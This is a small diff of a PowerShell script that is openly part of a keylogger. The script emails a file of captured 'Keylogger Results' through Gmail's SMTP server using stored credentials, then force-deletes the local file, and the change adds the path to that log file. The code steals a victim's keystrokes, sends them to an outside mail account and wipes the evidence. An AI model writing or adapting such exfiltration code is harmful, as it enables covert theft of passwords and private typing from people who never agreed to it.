@@ -6,7 +6,7 @@ $body = "Keylogger Results"
 $SMTPServer = "smtp.gmail.com"
 $SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
-
+$Path="C:\Users\atuna\Desktop\Eins.txt"
 
 send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
 	Remove-Item -Path $Path -force
